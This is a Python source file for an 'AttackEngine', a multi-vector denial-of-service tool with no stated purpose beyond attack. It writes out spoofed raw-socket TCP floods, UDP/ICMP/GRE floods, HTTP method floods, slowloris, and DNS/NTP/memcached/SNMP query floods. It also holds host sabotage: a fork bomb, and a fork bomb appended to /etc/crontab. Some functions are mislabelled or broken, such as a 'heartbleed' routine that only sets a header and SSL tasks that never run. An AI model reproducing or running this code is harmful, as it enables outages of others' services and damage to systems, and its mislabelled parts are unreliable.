import asyncio
import aiohttp
import socket
import struct
import random
import threading
import time
import os
import ssl
from concurrent.futures import ThreadPoolExecutor

class AttackEngine:
    def __init__(self, max_threads=2000, timeout=1):
        self.max_threads = max_threads
        self.timeout = timeout
        self.running = False
        self.executor = ThreadPoolExecutor(max_workers=max_threads)

    # ===================== LAYER 4 =====================
    def syn_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if not self.running: break
                src = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                iph = struct.pack('!BBHHHBBH4s4s', 0x45,0,40,0,0,64,6,0,socket.inet_aton(src),socket.inet_aton(ip))
                tcph = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port,0,0,0x02,0,0,0,0)
                s.sendto(iph + tcph, (ip, port))
        except: pass

    def ack_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if not self.running: break
                src = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                iph = struct.pack('!BBHHHBBH4s4s', 0x45,0,40,0,0,64,6,0,socket.inet_aton(src),socket.inet_aton(ip))
                tcph = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port,0,0,0x10,0,0,0,0)
                s.sendto(iph + tcph, (ip, port))
        except: pass

    def fin_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if not self.running: break
                src = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                iph = struct.pack('!BBHHHBBH4s4s', 0x45,0,40,0,0,64,6,0,socket.inet_aton(src),socket.inet_aton(ip))
                tcph = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port,0,0,0x01,0,0,0,0)
                s.sendto(iph + tcph, (ip, port))
        except: pass

    def rst_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(count):
                if not self.running: break
                src = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                iph = struct.pack('!BBHHHBBH4s4s', 0x45,0,40,0,0,64,6,0,socket.inet_aton(src),socket.inet_aton(ip))
                tcph = struct.pack('!HHLLBBHHH', random.randint(1024,65535), port,0,0,0x04,0,0,0,0)
                s.sendto(iph + tcph, (ip, port))
        except: pass

    def udp_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'X' * 65500
            for _ in range(count):
                if not self.running: break
                s.sendto(payload, (ip, port))
        except: pass

    def udp_frag_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(count):
                if not self.running: break
                s.sendto(b'X' * random.randint(1000, 65500), (ip, port))
        except: pass

    def icmp_flood(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(count):
                if not self.running: break
                pkt = struct.pack('!BBHHH', 8,0,0,random.randint(0,65535),0) + b'X'*65507
                s.sendto(pkt, (ip, 0))
        except: pass

    def igmp_flood(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IGMP)
            for _ in range(count):
                if not self.running: break
                s.sendto(b'\x11\x00\x00\x00' + b'X'*1000, (ip, 0))
        except: pass

    # ===================== LAYER 7 =====================
    async def http_get_flood(self, session, url):
        try:
            await session.get(url + f"?{random.randint(1,999999)}", timeout=self.timeout, ssl=False)
        except: pass

    async def http_post_flood(self, session, url):
        try:
            await session.post(url, data=b'A'*16384, timeout=self.timeout, ssl=False)
        except: pass

    async def http_head_flood(self, session, url):
        try:
            await session.head(url, timeout=self.timeout, ssl=False)
        except: pass

    async def http_options_flood(self, session, url):
        try:
            await session.options(url, timeout=self.timeout, ssl=False)
        except: pass

    async def http_put_flood(self, session, url):
        try:
            await session.put(url, data=b'A'*16384, timeout=self.timeout, ssl=False)
        except: pass

    async def http_delete_flood(self, session, url):
        try:
            await session.delete(url, timeout=self.timeout, ssl=False)
        except: pass

    async def http_patch_flood(self, session, url):
        try:
            await session.patch(url, data=b'A'*16384, timeout=self.timeout, ssl=False)
        except: pass

    async def http_trace_flood(self, session, url):
        try:
            await session.request('TRACE', url, timeout=self.timeout, ssl=False)
        except: pass

    async def http_connect_flood(self, session, url):
        try:
            await session.request('CONNECT', url, timeout=self.timeout, ssl=False)
        except: pass

    async def slowloris(self, session, url):
        try:
            headers = {'Connection': 'keep-alive', 'Keep-Alive': 'timeout=9999'}
            await session.get(url, headers=headers, timeout=self.timeout, ssl=False)
            await asyncio.sleep(100)
        except: pass

    async def rudy(self, session, url):
        try:
            await session.post(url, data=b'A'*1, timeout=self.timeout, ssl=False)
            await asyncio.sleep(5)
        except: pass

    async def range_flood(self, session, url):
        try:
            headers = {'Range': f'bytes=0-{random.randint(1000,999999)}'}
            await session.get(url, headers=headers, timeout=self.timeout, ssl=False)
        except: pass

    async def cache_buster(self, session, url):
        try:
            await session.get(url + f"?{random.randint(1,999999)}&_={int(time.time())}", timeout=self.timeout, ssl=False)
        except: pass

    # ===================== APPLICATION =====================
    def dns_amplification(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
            for _ in range(count):
                if not self.running: break
                s.sendto(query, (ip, 53))
        except: pass

    def ntp_amplification(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\x17\x00\x03\x2a' + b'\x00'*4
            for _ in range(count):
                if not self.running: break
                s.sendto(query, (ip, 123))
        except: pass

    def memcached_amplification(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
            for _ in range(count):
                if not self.running: break
                s.sendto(query, (ip, 11211))
        except: pass

    def snmp_amplification(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
            for _ in range(count):
                if not self.running: break
                s.sendto(query, (ip, 161))
        except: pass

    # ===================== OS LEVEL =====================
    def fork_bomb(self):
        while self.running:
            try:
                os.fork()
            except:
                pass

    def fd_exhaustion(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('0.0.0.0', random.randint(10000,65535)))
            except:
                pass

    def cron_flood(self):
        while self.running:
            try:
                with open('/etc/crontab', 'a') as f:
                    f.write("* * * * * root :(){ :|:& };:\n")
            except:
                pass

    def oom_killer_trigger(self):
        while self.running:
            try:
                data = b'X' * 1024 * 1024 * 10
                with open(f'/tmp/{random.randint(1,999999)}.tmp', 'wb') as f:
                    f.write(data)
            except:
                pass

    # ===================== SSL =====================
    async def ssl_renegotiation(self, session, url):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            async with session.get(url, ssl=ctx) as resp:
                await resp.read()
        except: pass

    async def ssl_heartbleed(self, session, url):
        try:
            await session.get(url, headers={'User-Agent': 'Heartbleed'}, timeout=self.timeout, ssl=False)
        except: pass

    # ===================== MIXED =====================
    def gre_flood(self, ip, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
            for _ in range(count):
                if not self.running: break
                s.sendto(b'\x00\x00\x00\x00' + b'X'*1400, (ip, 0))
        except: pass

    def sctp_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_SCTP)
            for _ in range(count):
                if not self.running: break
                s.sendto(b'\x00\x00\x00\x00' + b'X'*1400, (ip, port))
        except: pass

    def dccp_flood(self, ip, port, count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_DCCP)
            for _ in range(count):
                if not self.running: break
                s.sendto(b'\x00\x00\x00\x00' + b'X'*1400, (ip, port))
        except: pass

    # ===================== MAIN =====================
    async def single_attack(self, target, count):
        self.running = True
        ip = target.split(':')[0]
        port = int(target.split(':')[1]) if ':' in target else 80

        threads = []
        cnt = max(1, count // 40)

        # L4
        for m in [self.syn_flood, self.ack_flood, self.fin_flood, self.rst_flood]:
            t = threading.Thread(target=m, args=(ip, port, cnt))
            t.start()
            threads.append(t)

        t = threading.Thread(target=self.udp_flood, args=(ip, port, cnt))
        t.start()
        threads.append(t)

        t = threading.Thread(target=self.udp_frag_flood, args=(ip, port, cnt))
        t.start()
        threads.append(t)

        t = threading.Thread(target=self.icmp_flood, args=(ip, cnt))
        t.start()
        threads.append(t)

        t = threading.Thread(target=self.igmp_flood, args=(ip, cnt))
        t.start()
        threads.append(t)

        # Application
        for m in [self.dns_amplification, self.ntp_amplification, self.memcached_amplification, self.snmp_amplification]:
            t = threading.Thread(target=m, args=(ip, cnt))
            t.start()
            threads.append(t)

        # OS
        for m in [self.fork_bomb, self.fd_exhaustion, self.cron_flood, self.oom_killer_trigger]:
            t = threading.Thread(target=m)
            t.start()
            threads.append(t)

        # Mixed
        t = threading.Thread(target=self.gre_flood, args=(ip, cnt))
        t.start()
        threads.append(t)

        t = threading.Thread(target=self.sctp_flood, args=(ip, port, cnt))
        t.start()
        threads.append(t)

        t = threading.Thread(target=self.dccp_flood, args=(ip, port, cnt))
        t.start()
        threads.append(t)

        # HTTP
        url = f"http://{target}" if port != 443 else f"https://{target}"
        conn = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            tasks = []
            for _ in range(count // 3):
                if not self.running: break
                for m in [self.http_get_flood, self.http_post_flood, self.http_head_flood,
                           self.http_options_flood, self.http_put_flood, self.http_delete_flood,
                           self.http_patch_flood, self.http_trace_flood, self.http_connect_flood,
                           self.slowloris, self.rudy, self.range_flood, self.cache_buster]:
                    tasks.append(m(session, url))
                if len(tasks) >= self.max_threads:
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)

        # SSL
        if port == 443:
            for _ in range(count // 5):
                if not self.running: break
                tasks.append(self.ssl_renegotiation(session, url))
                tasks.append(self.ssl_heartbleed(session, url))

        for t in threads:
            t.join(timeout=0.1)

        self.running = False

    def stop(self):
        self.running = False
